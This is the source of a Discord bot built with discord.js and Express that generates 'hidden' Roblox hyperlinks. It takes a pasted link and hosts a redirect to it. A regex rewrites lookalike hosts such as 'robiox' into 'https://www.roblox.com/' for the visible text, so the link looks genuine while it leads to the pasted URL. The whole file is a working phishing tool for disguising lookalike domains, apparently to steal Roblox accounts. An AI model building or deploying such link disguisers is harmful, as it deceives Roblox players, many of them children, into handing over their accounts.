require('dotenv').config();
const { Client, GatewayIntentBits, ActionRowBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, MessageFlags } = require('discord.js');
const express = require('express');
const app = express();

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });
const linksDb = {};

// === WEB SERVER (добавил /ping для UptimeRobot) ===
app.get('/', (req, res) => res.send('Bot is active!'));
app.get('/ping', (req, res) => res.send('ok'));   // ← Добавлено

app.get('/r/:id', (req, res) => {
    const originalUrl = linksDb[req.params.id];
    console.log(`🔎 Redirecting ID: ${req.params.id}, link: ${originalUrl}`);
    if (originalUrl) {
        return res.redirect(originalUrl);
    }
    res.status(404).send('Link not found or expired');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Web server running on port ${PORT}`));

// === BOT ===
client.once('ready', () => console.log(`✅ Bot ${client.user.tag} is ready!`));

client.on('interactionCreate', async (interaction) => {
    console.log(`🟢 Interaction received: ${interaction.type} - ${interaction.customId}`); // ← Добавлено для диагностики

    if (interaction.isButton() && interaction.customId === 'create_hyperlink') {
        console.log(`🟢 BUTTON create_hyperlink pressed by ${interaction.user.tag}`); // ← Добавлено

        try {
            const modal = new ModalBuilder()
                .setCustomId('link_modal')
                .setTitle('Create Hidden Link');

            const input = new TextInputBuilder()
                .setCustomId('url_input')
                .setLabel('Paste Roblox link')
                .setStyle(TextInputStyle.Short)
                .setPlaceholder('https://www.roblox.com/...')
                .setRequired(true);

            modal.addComponents(new ActionRowBuilder().addComponents(input));

            await interaction.showModal(modal);
        } catch (error) {
            console.error('❌ Show modal error:', error.message);
        }
        return;
    }

    if (interaction.isModalSubmit() && interaction.customId === 'link_modal') {
        console.log(`📝 Modal submitted by ${interaction.user.tag}`);

        try {
            const url = interaction.fields.getTextInputValue('url_input');
            const id = Math.random().toString(36).substring(7);
            linksDb[id] = url;

            const shortUrl = `${process.env.BASE_URL}/r/${id}`;
            const visualUrl = url.replace(/https?:\/\/(robiox|roblox)[a-z0-9.-]+(\/|$)/i, 'https://www.roblox.com/').replace('https://', 'https_:_//');

            await interaction.reply({
                content: `<a:verify:1513286049638518824> Check your DMs!`,
                flags: [MessageFlags.Ephemeral]
            });

            try {
                await interaction.user.send({
                    embeds: [{
                        color: 0x274666,
                        title: '🔗 Hyperlink Generated',
                        description: '👇Your link is ready!\n\n🖱️Click on the code block below to copy it'
                    }]
                });

                await interaction.user.send({
                    content: `[\`${visualUrl}\`](${shortUrl})`
                });
            } catch (error) {
                console.error('Failed to send DM:', error);
                await interaction.followUp({
                    content: `⚠️ Failed to send DM. Here is your link: [\`${visualUrl}\`](${shortUrl})`,
                    flags: [MessageFlags.Ephemeral]
                });
            }
        } catch (error) {
            console.error('Modal processing error:', error);
        }
    }
});

client.login(process.env.TOKEN);
